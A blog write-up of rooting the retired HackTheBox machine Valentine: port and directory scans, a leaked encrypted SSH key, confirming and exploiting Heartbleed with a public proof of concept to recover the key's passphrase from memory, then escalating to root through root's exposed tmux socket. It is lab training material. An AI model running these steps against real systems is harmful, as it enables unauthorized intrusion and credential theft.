---
layout: post
title: "Writeup: HackTheBox Valentine - NO Metasploit"
description: "Rooting Valentine without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][].
All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Valentine

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.79</small>_

I kick things off with a port scan.

```bash
sudo nmap -T4 -p- 10.10.10.79
[sudo] password for artis3n: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:07 EDT
Nmap scan report for 10.10.10.79
Host is up (0.015s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
```

```bash
sudo nmap -T4 -sC -sV -p 22,80,443 10.10.10.79
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:08 EDT
Nmap scan report for 10.10.10.79
Host is up (0.051s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-06-21T18:14:44+00:00; +5m46s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5m45s
                                                                                                                 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                   
Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

All right, a web server.
[gobuster][] identifies several top-level endpoints worth digging into.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -u http://10.10.10.79/
===============================================================                                                  
Gobuster v3.0.1                                                                                                  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                  
===============================================================                                                  
[+] Url:            http://10.10.10.79/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/21 14:16:12 Starting gobuster
===============================================================
/dev (Status: 301)
/index (Status: 200)
/encode (Status: 200)
/decode (Status: 200)
/omg (Status: 200)
/server-status (Status: 403)
===============================================================
2020/06/21 14:18:35 Finished
===============================================================
```

`https://10.10.10.79/dev/` presents a directory list with a key and a note.

![dev dirlist][]

`https://10.10.10.79/dev/notes.txt` displays:

> To do:
>
> 1) Coffee.
>
> 2) Research.
>
> 3) Fix decoder/encoder before going live.
>
> 4) Make sure encoding/decoding is only done client-side.
>
> 5) Don't use the decoder/encoder until any of this is done.
>
> 6) Find a better way to take notes.

Don't use the encoder, huh?
`https://10.10.10.79/encode` takes input and presents base64-encoded content.
These are also PHP pages vulnerable to XSS, but that is less relevant for our purposes.

`https://10.10.10.79/dev/hype_key` appears to be a base64-encoded encrypted RSA key.
I put it into [CyberChef][] to decode it, but I suppose I could have use the `/decode` endpoint.

![hype decoded][]

I use [sslyze][] to check the SSL configuration of the web server.

```bash
sslyze --regular 10.10.10.79
```

It appears that the server is vulnerabe to [Heartbleed][].

```
 * SSL 2.0 Cipher suites:
     Attempted to connect using 7 cipher suites; the server rejected all cipher suites.

 * OpenSSL Heartbleed:
                                          VULNERABLE - Server is vulnerable to Heartbleed

 * OpenSSL CCS Injection:
                                          VULNERABLE - Server is vulnerable to OpenSSL CCS injection
```

I can confirm this with a heartbleed nmap NSE script:

```bash
artis3n@kali-pop:~/shares/htb/valentine$ ls /usr/share/nmap/scripts/* | grep heartbleed
/usr/share/nmap/scripts/ssl-heartbleed.nse
```

`nmap` confirms the server is vulnerable.

```bash
nmap --script ssl-heartbleed 10.10.10.79
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 15:00 EDT
Nmap scan report for 10.10.10.79
Host is up (0.011s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 

Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
```

Hearbleed allows stealing information from memory on the target server.
I grabbed [this Heartbleed PoC][heartbleed poc] and am able to extract data from memory.
The output is long but it includes this section:

```
00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D C8  mV0aGVoeXBlCg==.
0160: 2D 4C E2 FD EC 2F 4F 57 3D 84 67 64 C3 DA A9 8F  -L.../OW=.gd....
```

Grabbing that `$text` value and base64-decoding it results in what I guess is the password to the RSA key:

```
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

heartbleedbelievethehype
```

Using this as the password for the RSA key, I am able to SSH onto the box.
I don't know what user, but since the key is called `hype_key`, I use `hype` as the user.

```bash
ssh -i hype_key hype@10.10.10.79
load pubkey "hype_key": invalid format
Enter passphrase for key 'hype_key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$
```

Looks good!
I can grab the user flag.

`ps aux` shows that the `root` user is running a [tmux][] session.

![ps aux][]

```bash
root       1005  0.0  0.1  26416  1676 ?        Ss   11:11   0:01 /usr/bin/tmux -S /.devs/dev_sess
```

`man tmux` lets me know that `-S` is the socket path.

```
   -S socket-path
                 Specify a full alternative path to the server socket.  If -S is specified, the default
                 socket directory is not used and any -L flag is ignored.
```

If I look at this file, I see that the `hype` user is able to access the tmux socket and it has the `SUID` bit set.

![tmux socket dir][]

I should be able to connect `tmux` to this session and obtain a root shell.

```bash
tmux -S /.devs/dev_sess
```

![tmux root][]

I am now root and can collect the root flag.

[cyberchef]: https://gchq.github.io/CyberChef/
[gobuster]: https://github.com/OJ/gobuster
[hackthebox]: https://www.hackthebox.eu
[heartbleed]: https://heartbleed.com/
[heartbleed poc]: https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py
[sslyze]: https://tools.kali.org/information-gathering/sslyze
[tmux]: https://github.com/tmux/tmux/wiki

[dev dirlist]: /assets/img/htb/valentine/dev-dir-list.png
[hype decoded]: /assets/img/htb/valentine/dev-hype-key-decoded.png
[ps aux]: /assets/img/htb/valentine/ps-aux-root-tmux.png
[tmux root]: /assets/img/htb/valentine/tmux-root.png
[tmux socket dir]: /assets/img/htb/valentine/tmux-directory-permissions.png
